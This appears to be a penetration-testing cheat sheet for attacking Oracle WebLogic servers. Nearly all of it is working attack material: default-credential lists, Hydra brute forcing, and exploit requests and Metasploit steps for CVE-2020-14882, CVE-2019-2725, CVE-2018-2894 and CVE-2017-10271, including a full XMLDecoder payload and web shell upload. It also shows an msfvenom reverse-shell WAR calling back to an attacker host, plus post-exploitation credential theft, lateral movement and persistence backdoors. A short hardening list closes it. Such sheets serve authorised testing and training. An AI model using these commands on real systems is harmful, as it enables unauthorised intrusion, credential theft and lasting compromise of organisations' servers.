# WEBLOGIC ENUMERATION (Port 7001)

## SERVICE OVERVIEW
```
Oracle WebLogic is an enterprise Java application server
- Default admin port: 7001 (HTTP)
- HTTPS admin: 7002
- Production apps: 7003-7004
- Enterprise-grade Java EE server
- Multiple critical vulnerabilities
- Often found in corporate environments
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p7001 <IP>                             # Service/Version detection
curl -I http://<IP>:7001                         # HTTP headers
curl http://<IP>:7001/console | grep -i "weblogic\|version"
nc -nv <IP> 7001                                 # Manual connection
```

## WEBLOGIC DETECTION
```bash
# Detect WebLogic
curl http://<IP>:7001/console                    # Admin console
curl -I http://<IP>:7001 | grep -i "weblogic"

# WebLogic admin console login
curl http://<IP>:7001/console/login/LoginForm.jsp

# Version detection
curl http://<IP>:7001/console | grep -oP 'WebLogic Server [0-9]+\.[0-9]+'
curl http://<IP>:7001/console/framework/skins/wlsconsole/images/login_WebLogic_branding.png
nmap -sV -p7001 <IP> | grep -i weblogic
```

## DEFAULT CREDENTIALS
```bash
# Common WebLogic default credentials
weblogic:weblogic
weblogic:weblogic1
weblogic:welcome1
admin:admin
administrator:administrator
system:password
operator:operator

# Test login
curl -d "j_username=weblogic&j_password=weblogic" http://<IP>:7001/console/j_security_check
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -l weblogic -P passwords.txt -s 7001 <IP> http-form-post "/console/j_security_check:j_username=^USER^&j_password=^PASS^:F=Invalid"

# Custom script
for pass in weblogic weblogic1 welcome1 password admin; do
    echo "Testing: $pass"
    curl -d "j_username=weblogic&j_password=$pass" http://<IP>:7001/console/j_security_check -L | grep -q "Console" && echo "[+] Valid: weblogic:$pass"
done
```

## VULNERABILITY SCANNING
```bash
# Search for WebLogic exploits
searchsploit weblogic
searchsploit "oracle weblogic"

# Critical WebLogic CVEs:
# CVE-2020-14882: Admin console RCE (authentication bypass)
# CVE-2020-14883: Admin console RCE
# CVE-2019-2725: Deserialization RCE
# CVE-2019-2729: Deserialization RCE
# CVE-2018-2894: Path traversal + upload
# CVE-2018-3191: Deserialization RCE
# CVE-2018-3245: Deserialization RCE
# CVE-2017-10271: XMLDecoder RCE

nmap -p7001 --script vuln <IP>
```

## CVE-2020-14882 (CRITICAL UNAUTHENTICATED RCE)
```bash
# Authentication bypass + RCE
# Affects WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3, 12.2.1.4, 14.1.1.0

# Test for vulnerability
curl http://<IP>:7001/console/css/%252e%252e%252fconsole.portal

# If vulnerable, access admin console without auth!

# RCE via com.tangosol.coherence.mvel2.sh.ShellSession
curl -X POST "http://<IP>:7001/console/css/%252e%252e%252fconsole.portal" \
  -d "handle=com.tangosol.coherence.mvel2.sh.ShellSession('whoami')"

# Metasploit
msfconsole
use exploit/multi/http/oracle_weblogic_admin_handle_rce  # CVE-2020-14882/14883
set RHOSTS <IP>
set RPORT 7001
set LHOST <attacker_IP>
check
exploit

# Python exploit
git clone https://github.com/jas502n/CVE-2020-14882
python CVE-2020-14882.py -u http://<IP>:7001 -c "whoami"
```

## CVE-2019-2725 (DESERIALIZATION RCE)
```bash
# WebLogic wls9_async deserialization RCE

# Metasploit
msfconsole
use exploit/multi/http/weblogic_deserialize_asyncresponseservice  # CVE-2019-2725
set RHOSTS <IP>
set RPORT 7001
set LHOST <attacker_IP>
check
exploit

# Manual exploitation (complex)
# Requires crafted XML payload
```

## CVE-2018-2894 (PATH TRAVERSAL + UPLOAD)
```bash
# Arbitrary file upload via path traversal

# Upload web shell
curl -X POST "http://<IP>:7001/ws_utc/begin.do" \
  -F "fileField=@shell.jsp;filename=../../../public_html/shell.jsp"

# Access shell
curl http://<IP>:7001/shell.jsp?cmd=whoami

# Metasploit
use exploit/multi/http/weblogic_upload_exec       # CVE-2018-2894
set RHOSTS <IP>
set RPORT 7001
exploit
```

## CVE-2017-10271 (XMLDECODER RCE)
```bash
# WebLogic XMLDecoder RCE

# Metasploit
use exploit/multi/http/weblogic_xmldecoder        # CVE-2017-10271
set RHOSTS <IP>
set RPORT 7001
set LHOST <attacker_IP>
check
exploit

# Manual XML payload
curl -X POST "http://<IP>:7001/wls-wsat/CoordinatorPortType" \
  -H "Content-Type: text/xml" \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><java version="1.8.0" class="java.beans.XMLDecoder">
<object class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="1">
<void index="0"><string>calc.exe</string></void>
</array>
<void method="start"/></object>
</java></java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>'
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/http/weblogic_login        # Login scanner
use exploit/multi/http/oracle_weblogic_admin_handle_rce  # CVE-2020-14882/14883
use exploit/multi/http/weblogic_deserialize_asyncresponseservice  # CVE-2019-2725
use exploit/multi/http/weblogic_upload_exec      # CVE-2018-2894
use exploit/multi/http/weblogic_xmldecoder       # CVE-2017-10271
set RHOSTS <IP>
set RPORT 7001
run
```

## AUTHENTICATED ENUMERATION
```bash
# After successful login

# Deploy WAR file (RCE)
# 1. Login to http://<IP>:7001/console
# 2. Navigate to Deployments
# 3. Install new application
# 4. Upload malicious WAR file
# 5. Activate deployment

# Access deployed app
curl http://<IP>:7001/shell/
```

## CREATE MALICIOUS WAR
```bash
# Create reverse shell WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_IP> LPORT=4444 -f war > shell.war

# Deploy via console or weblogic.Deployer
java weblogic.Deployer -adminurl http://<IP>:7001 -username weblogic -password weblogic -deploy shell.war
```

## WEBLOGIC T3 PROTOCOL
```bash
# T3 protocol (proprietary WebLogic protocol)
# Runs on same ports as HTTP (7001)
# Used for internal communication
# Multiple deserialization vulnerabilities

# Nmap T3 detection
nmap -p7001 --script weblogic-t3-info <IP>

# T3 deserialization exploits (advanced)
# Requires specialized tools
```

## DIRECTORY ENUMERATION
```bash
# Common WebLogic paths
/console                                         # Admin console
/console/login/LoginForm.jsp                     # Login page
/console/framework/skins/wlsconsole/             # Console resources
/ws_utc/begin.do                                 # File upload (CVE-2018-2894)
/wls-wsat/CoordinatorPortType                    # XMLDecoder (CVE-2017-10271)
/_async/AsyncResponseService                     # Deserialization (CVE-2019-2725)
/uddiexplorer/                                   # UDDI Explorer
/bea_wls_internal/                               # Internal resources
/bea_wls_deployment_internal/                    # Deployment

# Directory brute forcing
gobuster dir -u http://<IP>:7001 -w /usr/share/wordlists/dirb/common.txt
```

## COMMON MISCONFIGURATIONS
```
☐ Default credentials (weblogic:weblogic)        # Easy access
☐ Admin console exposed to internet              # Should be internal only
☐ Outdated version with known CVEs               # Critical RCE vulnerabilities
☐ T3 protocol exposed                            # Deserialization attacks
☐ No IP restrictions                             # Anyone can access
☐ Debug mode enabled                             # Additional attack surface
☐ Sample applications deployed                    # May contain vulnerabilities
☐ Weak SSL/TLS (if using 7002)                   # Cryptographic attacks
```

## QUICK WIN CHECKLIST
```
☐ Detect WebLogic version
☐ Test default credentials (weblogic:weblogic)
☐ Test CVE-2020-14882 (auth bypass + RCE)
☐ Test CVE-2019-2725 (deserialization RCE)
☐ Test CVE-2018-2894 (path traversal + upload)
☐ Test CVE-2017-10271 (XMLDecoder RCE)
☐ Brute force admin credentials
☐ Check for exposed T3 protocol
☐ Look for sample applications
☐ Search for version-specific exploits
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive WebLogic scan
nmap -sV -p7001,7002 --script "http-* and weblogic-*" -oA weblogic_enum <IP>

# Quick CVE-2020-14882 test
curl -s http://<IP>:7001/console/css/%252e%252e%252fconsole.portal | grep -i "weblogic"

# Version check
curl -s http://<IP>:7001/console | grep -oP 'WebLogic Server [0-9]+\.[0-9]+'
```

## POST-EXPLOITATION (After Admin Access)
```bash
# 1. Deploy web shell WAR
# Via admin console or weblogic.Deployer

# 2. Create reverse shell
# Upload JSP shell via file upload vulns

# 3. Extract credentials
# Check domain configuration files:
/Oracle/Middleware/user_projects/domains/base_domain/config/config.xml
/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat

# 4. Decrypt WebLogic passwords
# Use weblogic.security.Encrypt tool (requires SerializedSystemIni.dat)

# 5. Lateral movement
# Access other managed servers
# Extract database credentials from data sources

# 6. Persistence
# Deploy backdoor application
# Create new admin user
# Modify startup scripts
```

## WEBLOGIC CONFIGURATION FILES
```bash
# Important WebLogic files
/Oracle/Middleware/user_projects/domains/base_domain/config/config.xml          # Domain config
/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat  # Encryption key
/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties  # Boot credentials
/Oracle/Middleware/wlserver/server/lib/console-ext/diagnostics/manifest.mf      # Console extension
```

## SECURITY IMPLICATIONS
```
CRITICAL RISKS:
1. Multiple critical RCE vulnerabilities
2. Default credentials commonly used
3. Deserialization attacks (T3 protocol)
4. Authentication bypass (CVE-2020-14882)
5. File upload vulnerabilities
6. XMLDecoder RCE
7. Admin console exposed to internet
8. Full server control if compromised
9. Often contains enterprise data/databases

RECOMMENDATION:
- Update to latest patched version immediately
- Change default credentials
- Restrict admin console to internal network/VPN
- Disable T3 protocol if not needed
- Apply all critical security patches
- Use firewall to block ports 7001/7002
- Monitor for exploitation attempts
- Regular security audits
- Implement network segmentation
```

## WEBLOGIC PORT MAPPING
```
Common WebLogic ports:
7001 - Admin server (HTTP)
7002 - Admin server (HTTPS)
7003 - Managed server 1
7004 - Managed server 2
5556 - Node Manager (SSL)
8001 - Application server
9002 - Coherence cluster port
```
